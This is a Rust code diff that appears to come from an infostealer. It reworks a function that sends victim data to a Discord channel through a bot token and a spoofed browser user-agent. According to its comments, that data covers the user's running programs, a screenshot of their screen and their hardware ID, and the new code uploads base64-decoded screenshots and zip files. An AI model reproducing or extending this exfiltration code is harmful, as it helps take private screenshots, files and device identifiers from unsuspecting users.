@@ -17,38 +17,60 @@ lazy_static::lazy_static! {
 // The data includes the users running programs, the
 // a screenshot of the users screen, the users hwid, etc.
 async fn send_message(channel: i64, body: serde_json::Value) -> Result<String, ()> {
-    // Create empty form data array
-    let mut form: Vec<(&str, String)> = Vec::new();
+    let req = CLIENT
+        .post(&format!("https://discord.com/api/v8/channels/{}/messages", channel))
+        .header("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
+        .header("authorization", format!("Bot {}", DISCORD_TOKEN.to_string()))
+        .header("content-type", "application/json");
+        
+        
+    /*
+        .form(&(
+            "attachments", json!([
+                {
+                    "filename": "screenshot.png",
+                    "value": body.get("image").unwrap().to_string()
+                },
+                {
+                    "filename": "zip_file.txt",
+                    "value": body.get("zip_file").unwrap().to_string()
+                }
+            ])
+        ));
+    */
 
+    /*
+    
     // Get the embed from the request body
     match body.get("embed") {
-        Some(embed) => form.push(("embeds", embed.to_string())),
+        Some(embed) => req.body(json!({ "embeds": embed })),
         None => ()
     };
+    */
+
     // Get the image from the request body
-    match body.get("image") {
-        Some(image) => form.push(("file", image.to_string())),
-        None => ()
-    };
-    // Get the hardware info from the request body
-    match body.get("hardware_info") {
-        Some(info) => match base64::decode(info.to_string()) {
-            Ok(data) => match std::str::from_utf8(&data) {
-                Ok(s) => form.push(("hardware_info", s.to_string())),
-                Err(_) => return Err(())
-            },
-            Err(_) => return Err(())
+    // and decode it from base64 then set it as the
+    // request body for the outgoing request.
+    let req = match body.get("image") {
+        Some(image) => match base64::decode(image.to_string()) {
+            Ok(image) => req.body(image),
+            Err(_) => req
         },
-        None => ()
+        None => req
+    };
+    // Get the zip file from the request body
+    // and decode it from base64 then set it as the
+    // request body for the outgoing request.
+    let req = match body.get("zip_file") {
+        Some(zip) => match base64::decode(zip.to_string()) {
+            Ok(zip) => req.body(zip),
+            Err(_) => req
+        },
+        None => req
     };
 
     // Send the http request
-    return match CLIENT.post(&format!("https://discord.com/api/v8/channels/{}/messages", channel))
-        .header("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
-        .header("authorization", format!("Bot {}", DISCORD_TOKEN.to_string()))
-        .form(&form)
-        .send().await 
-    {
+    return match req.send().await {
         Ok(r) => match r.text().await {
             Ok(t) => Ok(t),
             Err(_) => Err(())
